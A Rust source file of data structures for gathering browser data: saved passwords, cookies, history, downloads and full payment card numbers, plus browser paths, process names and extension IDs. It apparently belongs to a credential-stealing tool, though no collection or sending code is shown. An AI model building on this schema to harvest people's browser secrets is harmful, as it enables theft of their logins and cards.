use std::path::PathBuf;

#[derive(Debug, serde::Serialize)]
pub struct BrowserData {
    pub passwords: Vec<PasswordEntry>,
    pub cookies: Vec<CookieEntry>,
    pub history: Vec<HistoryEntry>,
    pub downloads: Vec<DownloadEntry>,
    pub cards: Vec<CardEntry>,
    pub extensions_count: usize,
}

impl Default for BrowserData {
    fn default() -> Self {
        Self {
            passwords: Vec::new(),
            cookies: Vec::new(),
            history: Vec::new(),
            downloads: Vec::new(),
            cards: Vec::new(),
            extensions_count: 0,
        }
    }
}

#[derive(Debug, serde::Serialize, Clone)]
pub struct PasswordEntry {
    pub url: String,
    pub username: String,
    pub password: String,
    #[serde(skip)]
    pub encrypted_password: Vec<u8>,
    pub browser: String,
}

#[derive(Debug, serde::Serialize, Clone)]
pub struct CookieEntry {
    pub host: String,
    pub name: String,
    pub path: String,
    pub value: String,
    #[serde(skip)]
    pub encrypted_value: Vec<u8>,
    pub expires: i64,
    pub browser: String,
}

#[derive(Debug, serde::Serialize, Clone)]
pub struct HistoryEntry {
    pub url: String,
    pub title: String,
    pub last_visit: i64,
    pub browser: String,
}

#[derive(Debug, serde::Serialize, Clone)]
pub struct DownloadEntry {
    pub path: String,
    pub url: String,
    pub browser: String,
}

#[derive(Debug, serde::Serialize, Clone)]
pub struct CardEntry {
    pub name: String,
    pub expiration_month: i32,
    pub expiration_year: i32,
    pub card_number: String,
    #[serde(skip)]
    pub encrypted_card_number: Vec<u8>,
    pub date_modified: i64,
    pub browser: String,
}

pub struct BrowserInfo {
    pub name: &'static str,
    pub path: PathBuf,
    pub process: &'static str,
}

pub struct ExtensionInfo {
    pub name: &'static str,
    pub extension_id: &'static str,
}
